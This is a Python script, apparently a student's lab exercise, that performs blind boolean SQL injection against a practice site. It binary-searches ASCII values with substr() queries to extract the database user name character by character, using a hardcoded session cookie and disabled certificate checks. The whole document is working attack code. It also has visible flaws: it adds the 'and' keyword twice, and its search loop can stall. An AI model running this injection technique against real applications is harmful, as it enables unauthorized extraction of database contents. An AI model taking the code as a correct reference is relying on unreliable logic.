import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 인증서 없을 때 오류 안보이게 함

url = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61 and "
h = {"Host":"lab.eqst.co.kr:8110"}
c = {"JSESSIONID":"07D874FC9D32AAB1E8767100BA45B23C"}


# while (1):
#     sqli = input(f"공격쿼리 입력: {url}")
#     res = requests.get(url+sqli,headers=h,cookies=c,verify=False)
#     if "애플" in res.text:
#         print(f'hihi')
#     else:
#         print(':(')
# print(res.text)

for j in range(1,9):
    start = 1
    end = 127
    cha = 1
    while start < end:
        mid = int((start + end) / 2)
        query = f"(ascii(substr(user,{j},1))) < {mid}"
        attackurl = url + " and " + query
        res = requests.get(attackurl, cookies=c, verify=False) # verify: SSL 에러 때문에 
        if  "iOS" in res.text:
            end = mid-1
        else:
            start = mid
        cha = cha + 1
    print(f"{j}번째 글자: " + chr(end))

# 85
# 1~127 -> 64 no
# 64~127 -> 95 yes
# 64~94 -> 80 no
# 80~96 -> 88 yes
# 80~87 -> 84 no